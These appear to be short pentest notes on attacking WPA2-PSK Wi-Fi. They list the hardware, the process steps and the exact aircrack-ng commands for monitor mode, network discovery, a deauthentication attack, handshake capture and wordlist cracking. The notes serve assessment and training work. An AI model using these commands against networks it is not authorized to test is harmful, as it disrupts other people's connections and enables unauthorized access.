### Wireless PenTest

Assessment of wireless network
- WPA2 PSK
- WPA2 Enterprise

Activities performed
- Evaluating strength of PSK
- Reviewing nearby networks
- Assessing guest networks
- Checking network access

### Tools 

Wireless Card
- Alfa AWUS036NH

Router
- TP-LINK AC2300 Wireless

Laptop

### The Hacking Process (WPA2 PSK)

Place
- Place wireless card into monitor mode

Discover
- Discover information about network
- - Channel
- - BSSID

Select
- Select network and capture data

Perform
- Perfrom deauth attack

Capture
- Capture WPA handshake

Attempt
- Attempt to crack the handshake

### aircrack-ng

check if wireless card info
```
iwconfig
```

start monitor mode
```
airmon-ng check kill
airmon-ng start wlan0
```

search available newtwork
```
airodump-ng wlan0mon
# note channel and bssid
```

listen for 3-way handshake
```
airodump-ng -c channel --bssid bssid -w capture wlan0mon
```

deauth attack
```
aireplay-ng -0 1 -a bssid -c station wlan0mon
```

cracking 3-way handshake
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b bssid capture.cap
```
